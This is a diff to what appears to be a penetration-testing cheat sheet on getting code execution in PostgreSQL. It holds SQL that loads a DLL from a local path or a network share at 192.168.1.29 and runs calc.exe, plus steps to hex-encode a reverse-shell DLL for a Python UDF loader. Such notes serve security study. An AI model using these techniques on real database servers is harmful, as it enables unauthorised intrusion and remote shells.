@@ -361,7 +361,7 @@ In postgres (2nd way):
 --check for function first
 \df test
 
---Create function from compiled DLL (see script/web/postgresmodule.c)
+--Create function from compiled DLL (see script/web/postgres/postgresmodule.c)
 create or replace function test(text, integer) returns void as $$c:\compiled.dll$$, $$awae$$ LANGUAGE C STRICT;
 create or replace function test(text, integer) returns void as $$//192.168.1.29/impk_share/compiled.dll$$, $$awae$$ LANGUAGE C STRICT;
 
@@ -372,6 +372,13 @@ select test($$calc.exe$$, 3);
 drop function test(text, integer);
 {% endhighlight %}
 
+
+In postgres (3rd way - UDF):
+{% highlight sql %}
+--compile example DLL (see script/web/postgres/postgresmodule.c) and convert it to a hex string (xxd revshell.dll | cut -d" " -f 2-9 | sed 's/ //g' | tr -d '\n' > revshell.dll.txt)
+--run python posgresUDF.py (see script/web/postgres/postgresUDF.py)
+
+{% endhighlight %}
 
 > **SQL Injection Cheat Sheets**
 
